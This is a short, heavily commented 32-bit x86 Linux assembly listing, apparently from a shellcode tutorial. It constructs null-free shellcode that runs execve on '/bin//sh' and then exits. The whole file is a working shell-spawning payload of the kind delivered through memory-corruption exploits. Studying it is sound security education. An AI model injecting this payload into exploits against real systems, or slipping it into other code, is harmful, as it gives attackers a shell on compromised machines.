.text
.global _start
_start:
    ### execve("/bin/sh", ["/bin/sh", NULL], NULL); ###
    xor %eax, %eax      # XOR %eax with itself, zeroing it out
    push %eax           # Push %eax (NULL) onto the stack
    push $0x68732f2f    # Push "//sh" onto the stack
    push $0x6e69622f    # Push "/bin" onto the stack, %esp now points to it
    mov %esp, %ebx      # %ebx now holds the starting address of "/bin//sh"
    push %eax           # Push %eax (NULL) onto the stack
    push %ebx           # Push %ebx ("/bin//sh\0") onto the stack, %esp now points to it
    mov %esp, %ecx      # %ecx now holds starting address of ["/bin//sh", NULL]
    xor %edx, %edx      # XOR %edx with itself, zeroing it out
    mov $11, %al        # Store syscall for execve (11) in %eax, via %al
    int $0x80           # Interrupt to make the syscall


    ### exit(0); ###
    xor %eax, %eax      # XOR %eax with itself, zeroing it out
    mov $1, %al         # Store syscall for exit (1) in %eax, via %al
    xor %ebx, %ebx      # Store the exit value we want to return in %ebx by XORing it to get 0
    int $0x80           # Interrupt to make the syscall
